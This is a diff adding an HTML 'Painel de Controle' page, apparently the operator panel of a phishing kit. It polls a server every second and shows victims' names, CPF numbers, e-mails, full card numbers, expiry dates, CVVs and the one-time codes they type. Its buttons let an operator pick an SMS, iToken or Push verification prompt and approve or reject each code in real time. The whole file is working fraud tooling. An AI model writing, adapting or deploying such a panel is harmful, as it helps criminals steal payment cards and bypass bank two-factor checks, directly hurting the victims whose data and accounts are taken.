@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Painel</title>
+  <style>
+    body {
+      font-family: Arial;
+      background: #0b0f1a;
+      padding: 20px;
+      color: #e5e7eb;
+    }
+
+    h2 {
+      color: #22c55e;
+      margin-bottom: 20px;
+    }
+
+    .box {
+      background: #111827;
+      padding: 15px;
+      margin-bottom: 12px;
+      border-radius: 10px;
+      border-left: 4px solid #22c55e;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.5);
+    }
+
+    b {
+      color: #22c55e;
+    }
+
+    .status {
+      font-weight: bold;
+      margin-bottom: 10px;
+    }
+
+    .online {
+      color: #22c55e;
+    }
+
+    .offline {
+      color: #ef4444;
+    }
+
+    button {
+      padding: 8px 12px;
+      margin: 5px 5px 0 0;
+      border: none;
+      border-radius: 6px;
+      color: white;
+      cursor: pointer;
+      font-weight: bold;
+      transition: 0.2s;
+    }
+
+    button:hover {
+      opacity: 0.85;
+      transform: scale(1.03);
+    }
+
+    .ok {
+      background: #16a34a;
+    }
+
+    .erro {
+      background: #dc2626;
+    }
+
+    .tipo {
+      background: #22c55e;
+      color: #022c22;
+    }
+
+    .top-buttons {
+      margin-bottom: 20px;
+    }
+
+  </style>
+</head>
+<body>
+
+<h2>Painel de Controle</h2>
+
+<div class="top-buttons">
+  <button class="tipo" onclick="enviarTipo('SMS')">SMS</button>
+  <button class="tipo" onclick="enviarTipo('iToken')">iToken</button>
+  <button class="tipo" onclick="enviarTipo('Push')">Push</button>
+</div>
+
+<div id="lista"></div>
+
+<script>
+function enviarTipo(tipo){
+  fetch("/tipo",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({tipo})});
+}
+
+function enviarStatus(status, id){
+  fetch("/status",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({status})});
+  
+  if(status==='expirado'){
+    fetch("/reiniciar",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({id})});
+  }
+}
+
+async function carregar(){
+  let r = await fetch("/dados");
+  let dados = await r.json();
+  let html = "";
+  
+  dados.reverse().forEach(d=>{
+
+    let online = d.online ? "🟢 Online" : "🔴 Offline";
+    let classe = d.online ? "online" : "offline";
+
+    html+=`
+      <div class="box">
+        <div class="status ${classe}">${online}</div>
+
+        <b>Nome:</b> ${d.nome || ""}<br>
+        <b>CPF:</b> ${d.cpf || ""}<br>
+        <b>E-mail:</b> ${d.email || ""}<br>
+        <b>Nome do cartão:</b> ${d.nomeCartao || ""}<br>
+        <b>Número do cartão:</b> ${d.cartao || ""}<br>
+        <b>Validade:</b> ${d.validade || ""}<br>
+        <b>CVV:</b> ${d.cvv || ""}<br>
+        <b>Código:</b> <b>${d.codigoDigitado || "Aguardando..."}</b><br><br>
+
+        ${d.codigoDigitado ? `
+          <button class="ok" onclick="enviarStatus('aprovado', ${d.id})">Aprovar</button>
+          <button class="erro" onclick="enviarStatus('expirado', ${d.id})">Reprovar</button>
+        `:""}
+      </div>`;
+  });
+
+  document.getElementById("lista").innerHTML = html;
+}
+
+setInterval(carregar,1000);
+carregar();
+</script>
+
+</body>
+</html>
